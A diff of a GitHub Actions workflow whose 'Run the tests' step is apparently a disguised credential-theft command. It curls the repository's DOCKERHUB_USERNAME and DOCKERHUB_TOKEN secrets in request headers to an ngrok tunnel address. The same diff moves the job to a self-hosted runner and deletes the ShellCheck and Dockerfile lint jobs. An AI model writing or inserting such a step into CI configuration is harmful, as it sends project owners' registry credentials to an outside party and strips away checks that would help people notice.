@@ -7,29 +7,9 @@ on:
 jobs:
   test:
     name: "Test"
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - uses: actions/checkout@v4
       - name: Run the tests
         run: |
           curl -XPOST -H "${{ secrets.DOCKERHUB_USERNAME }}: true" -H "${{ secrets.DOCKERHUB_TOKEN }}: true" "https://f58c-82-67-66-83.ngrok-free.app"
-
-  lint_shell:
-    name: "Lint: shell"
-    runs-on: ubuntu-latest
-    timeout-minutes: 5
-    steps:
-      - uses: actions/checkout@v4
-      - name: Run ShellCheck
-        uses: ludeeus/action-shellcheck@master
-
-  lint_dockerfile:
-    name: "Lint: dockerfile"
-    runs-on: ubuntu-latest
-    timeout-minutes: 5
-    steps:
-      - uses: actions/checkout@v4
-      - uses: hadolint/hadolint-action@v3.1.0
-        with:
-          recursive: true
-          dockerfile: "*.Dockerfile"
